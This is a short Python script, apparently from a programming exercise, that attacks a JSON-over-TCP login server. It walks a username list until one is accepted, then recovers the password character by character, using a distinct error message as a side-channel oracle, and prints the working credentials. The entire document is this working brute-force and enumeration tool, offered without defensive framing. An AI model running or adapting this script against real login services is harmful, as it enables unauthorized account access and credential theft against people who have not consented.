import json
import socket
import sys
from string import ascii_letters, digits

argv = sys.argv

def yield_login(file):
    with open(file, 'r') as file_lines:
        for line in file_lines:
            yield line.strip("\n")

creds = {}
logins = yield_login('logins.txt')

with socket.socket() as client:
    address = argv[1], int(argv[2])
    client.connect(address)

    while True:
        creds["login"] = next(logins)
        creds["password"] = "password"
        data = json.dumps(creds)
        client.send(data.encode())
        response = json.loads(client.recv(1024).decode())
        if response["result"] == "Wrong login!":
            continue
        elif response["result"] == "Wrong password!":
            break

    found = False
    length = 1
    s = ""
    while not found:
        for c in ascii_letters + digits:
            creds["password"] = s + c
            data = json.dumps(creds)
            client.send(data.encode())
            response = json.loads(client.recv(1024).decode())
            if response["result"] == "Connection success!":
                print(data)
                found = True
            elif response["result"] == "Exception happened during login":
                s = s + c
                length += 1
            else:
                continue
            break